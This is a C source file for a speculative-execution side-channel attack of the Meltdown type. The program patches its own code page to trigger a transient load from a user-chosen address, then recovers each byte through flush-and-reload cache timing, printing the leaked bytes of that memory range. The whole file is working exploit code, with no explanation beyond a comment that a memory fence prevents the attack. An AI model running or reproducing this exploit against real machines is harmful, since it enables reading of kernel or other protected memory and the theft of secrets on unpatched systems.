#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>

//#define DEBUG
#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

#define CYCLES		1000
#define ESTIMATE_CYCLES	100000

static inline int get_access_time(volatile char *addr)
{
	unsigned long long time1, time2;
	unsigned junk;
	time1 = __rdtscp(&junk);
	(void)*addr;
	time2 = __rdtscp(&junk);
	return time2 - time1;
}

static char target_array[VARIANTS_READ * TARGET_SIZE];
static int cache_hit_threshold;
static int hist[VARIANTS_READ];

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

static void pin_cpu0()
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

static inline void clflush_target(void)
{
	int i;
	for (i = 0; i < VARIANTS_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

static void set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		cached += get_access_time(target_array);
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		cached += get_access_time(target_array);
	}

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached) + 30;

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached * 2, uncached, cache_hit_threshold);
}

static void check(void)
{
	int i, time, mix_i;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);
		if (time <= cache_hit_threshold) {
			hist[mix_i]++;
		}
	}
}

uint8_t temp;

static void __attribute__((noinline))
scsb(unsigned long addr)
{
	asm volatile (
		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (target_array),
	  	  [addr] "r" (addr)
		: "rax", "rbx"
	);
}

static unsigned long **juck1;
static unsigned long *juck2;
static unsigned long juck3;

static int readbyte(int fd, unsigned long addr)
{
	int i, j, ret = 0, max = -1, maxi = -1;
	char tmp = *((volatile char *)scsb);
	static char buf[256];

	memset(hist, 0, sizeof(hist));
	
	for (i = 0; i < CYCLES; i++) {
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
			perror("pread");
			break;
		}

		clflush_target();
		_mm_mfence();

		juck3 = 0xc3;
		_mm_clflush(&juck3);
		juck2 = &juck3;
		_mm_clflush(&juck2);
		juck1 = &juck2;
		_mm_clflush(&juck1);
		_mm_mfence();

		*((volatile char *)scsb) = **juck1;
		//_mm_mfence(); // will prevent the attack
		
		scsb(addr);

		check();
		*((volatile char *)scsb) = tmp;
		_mm_mfence();
	}

#ifdef DEBUG
	for (i = 0; i < VARIANTS_READ; i++)
		if (hist[i] > 0)
			printf("hist[%c] = %d\n", i, hist[i]);
#endif

	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}
	return maxi;
}

static char *progname;
int usage(void)
{
	printf("%s: [hexaddr] [size]\n", progname);
	return 2;
}

int main(int argc, char *argv[])
{
	int ret, i, j, score;
	unsigned long scsb_addr;
	unsigned long addr, size;
	volatile int dummy = 0;

	int pagesize = sysconf(_SC_PAGE_SIZE);
	scsb_addr = (unsigned long)(&scsb);
	scsb_addr = scsb_addr & 0xffffffffffffc000;
	mprotect((void *)scsb_addr, pagesize, 7);

	progname = argv[0];
	if (argc < 3)
		return usage();

	if (sscanf(argv[1], "%lx", &addr) != 1)
		return usage();

	if (sscanf(argv[2], "%lx", &size) != 1)
		return usage();

	memset(target_array, 1, sizeof(target_array));

	pin_cpu0();
	set_cache_hit_threshold();

	int fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	for (score = 0, i = 0; i < size; i++) {
		ret = readbyte(fd, addr);
		if (ret == -1)
			ret = 0xff;
		printf("read %x \033[1;31m%c\033[0m (score=%d/%d)\n",
		       ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? hist[ret] : 0,
		       CYCLES);
		addr++;
	}

	close(fd);
	return 0;
}
